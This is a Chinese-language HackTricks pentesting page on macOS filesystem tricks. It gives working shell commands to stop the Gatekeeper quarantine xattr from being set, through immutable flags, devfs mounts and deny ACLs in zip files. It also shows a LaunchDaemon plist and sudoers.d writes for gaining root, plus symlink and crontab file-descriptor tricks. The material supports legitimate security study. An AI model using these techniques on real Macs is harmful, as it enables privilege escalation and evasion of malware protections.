# macOS文件系统技巧

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云平台 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## POSIX权限组合

目录的权限：

* **读取** - 可以**枚举**目录条目
* **写入** - 可以**删除/写入**目录中的文件
* **执行** - 允许**遍历**目录 - 如果没有此权限，无法访问其中的任何文件或子目录。

### 危险组合

如何覆盖由root拥有的文件/文件夹，但是：

* 路径中的一个父目录所有者是用户
* 路径中的一个父目录所有者是具有**写入权限**的**用户组**
* 用户组对文件具有**写入**权限

使用上述任何组合，攻击者可以通过在预期路径中**注入**一个**符号/硬链接**来获得特权任意写入。

### 文件夹根目录 R+X 特殊情况

如果有文件位于**只有root具有R+X访问权限的目录**中，则其他人无法访问这些文件。因此，如果存在漏洞允许将一个由用户可读但由于该**限制**而无法读取的文件从该文件夹**移动到另一个文件夹**，则可以滥用此漏洞来读取这些文件。

示例：[https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## 符号链接 / 硬链接

如果一个特权进程正在写入**文件**，该文件可以被**低权限用户控制**，或者可以被**低权限用户预先创建**。用户可以通过符号链接或硬链接将其指向另一个文件，特权进程将在该文件上进行写入。

在其他部分中查看攻击者可以**滥用任意写入来提升权限**的地方。

## 任意FD

如果你可以让一个进程以高权限打开一个文件或文件夹，你可以滥用**`crontab`**来使用**`EDITOR=exploit.py`**打开`/etc/sudoers.d`中的文件，这样`exploit.py`将获得`/etc/sudoers`中的文件的FD并滥用它。

例如：[https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## 避免隔离xattrs的技巧

### uchg / uchange / uimmutable标志

如果一个文件/文件夹具有这个不可变属性，就无法在其上放置xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs 挂载

**devfs** 挂载**不支持 xattr**，更多信息请参考 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### 写入扩展属性访问控制列表（ACL）

此ACL防止向文件添加`xattrs`。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**文件格式会将文件及其ACE（访问控制项）一起复制。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中，可以看到存储在名为**`com.apple.acl.text`**的xattr中的ACL文本表示将被设置为解压后文件的ACL。因此，如果您将应用程序压缩为使用**AppleDouble**文件格式的zip文件，并且该ACL阻止其他xattr写入它...则隔离xattr不会设置到应用程序中：

有关更多信息，请查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)。

要复制此操作，首先需要获取正确的acl字符串：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（请注意，即使这样做，沙盒也会在写入隔离的xattr之前）

虽然不是必需的，但我还是把它放在这里以防万一：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## 挂载DMG

用户可以挂载一个自定义的DMG，甚至可以覆盖一些现有的文件夹。以下是创建带有自定义内容的自定义DMG包的方法：

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote
```
{% endcode %}

## 任意写入

### 定期的 sh 脚本

如果你的脚本可以被解释为一个 **shell 脚本**，你可以覆盖 **`/etc/periodic/daily/999.local`** shell 脚本，该脚本将每天触发一次。

你可以使用以下命令**伪造**执行该脚本：**`sudo periodic daily`**

### 守护进程

编写一个任意的 **LaunchDaemon**，比如 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**，其中包含一个执行任意脚本的 plist 文件，例如：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
只需生成脚本`/Applications/Scripts/privesc.sh`，其中包含您想以root身份运行的**命令**。

### Sudoers文件

如果您具有**任意写入权限**，可以在**`/etc/sudoers.d/`**文件夹中创建一个文件，授予自己**sudo**权限。

## 参考资料

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
